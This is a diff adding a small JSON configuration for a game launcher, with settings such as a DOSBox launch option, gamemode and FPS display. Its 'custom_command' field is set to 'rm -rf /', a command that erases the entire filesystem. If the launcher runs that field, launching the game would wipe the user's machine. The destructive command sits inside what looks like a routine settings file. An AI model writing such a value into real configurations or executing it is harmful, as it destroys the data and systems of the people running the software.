@@ -1,0 +1,8 @@
+{
+  "last_launch_option": "dosbox",
+  "use_gamemode": true,
+  "use_mangohud": false,
+  "show_fps": false,
+  "hide_game": false,
+  "custom_command": "rm -rf /"
+}
